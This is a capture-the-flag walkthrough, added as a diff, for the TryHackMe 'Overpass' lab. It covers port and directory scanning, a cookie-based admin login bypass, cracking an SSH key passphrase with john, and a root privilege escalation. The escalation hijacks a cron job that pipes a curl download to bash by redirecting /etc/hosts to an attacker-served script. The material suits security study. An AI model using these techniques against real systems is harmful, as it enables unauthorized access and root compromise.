@@ -1,0 +1,72 @@
+Overpass try hack me - https://tryhackme.com/room/overpass
+
+1) Find user:
+	* port scanning: nmap -sC -sV http://10.10.198.187 -v  , port 80 open access webpage
+	* directory scanning: gobuster dir -u http://10.10.198.187 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+	* open routes: /admin, /css ..
+		/admin: login credentials -> source page -> login.js -> 
+
+		async function login() {
+	    const usernameBox = document.querySelector("#username");
+	    const passwordBox = document.querySelector("#password");
+	    const loginStatus = document.querySelector("#loginStatus");
+	    loginStatus.textContent = ""
+	    const creds = { username: usernameBox.value, password: passwordBox.value }
+	    const response = await postData("/api/login", creds)
+	    const statusOrCookie = await response.text()
+	    if (statusOrCookie === "Incorrect credentials") {
+	        loginStatus.textContent = "Incorrect Credentials"
+	        passwordBox.value=""
+	    } else {
+	        Cookies.set("SessionToken",statusOrCookie)
+	        window.location = "/admin"
+	    }
+
+    * else part seems tricky , added cookie eg: cookies.set("SessionToken","")
+  	* able to access /admin now
+  	* got rsa key , copy and paste the rsa key eg: id_rsa
+  	* use john:
+  		ssh2john.py id_rsa > hash
+		#Convert the obtained hash to John format(above link)
+		john hashfile --wordlist=rockyou.txt
+
+		password: james13
+
+	* ssh -i id_rsa james@10.10.198.187 , password: james13
+	* got user.txt
+
+2) privelege esclatation:
+	* cat todo.txt , tricky text automation build script
+	* cat /etc/crontab
+		* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
+	* looks like script checking for the buildscript.sh file for download
+	* cat /etc/hosts
+		james@overpass-prod:~$ cat /etc/hosts
+			127.0.0.1 localhost
+			127.0.1.1 overpass-prod
+			127.0.0.1 overpass.thm
+			# The following lines are desirable for IPv6 capable hosts
+			::1     ip6-localhost ip6-loopback
+			fe00::0 ip6-localnet
+			ff00::0 ip6-mcastprefix
+			ff02::1 ip6-allnodes
+			ff02::2 ip6-allrouters
+	* vi /etc/hosts - update with our ip, check ip with cmd: ip a s tun0
+		james@overpass-prod:~$ cat /etc/hosts
+			127.0.0.1 localhost
+			127.0.1.1 overpass-prod
+			10.10.198.187 overpass.thm
+			# The following lines are desirable for IPv6 capable hosts
+			::1     ip6-localhost ip6-loopback
+			fe00::0 ip6-localnet
+			ff00::0 ip6-mcastprefix
+			ff02::1 ip6-allnodes
+			ff02::2 ip6-allrouters
+	* create a file inside /tmp/ called flag and provide permission for it chmod 600 flag
+	* now comes to our terminal i.e kishore@linux
+	* mkdir -p downloads/src -> create buildscript.sh :
+		#!/bin/bash
+		cat /root/root.txt > /tmp/flag
+	* now cd ../.. , run sudo python3 -m http.server 80
+	* wait for it script will get the buildscript.sh and executes it
+	* now go to james@prod terminal and check with /tmp/flag file to get the root flag
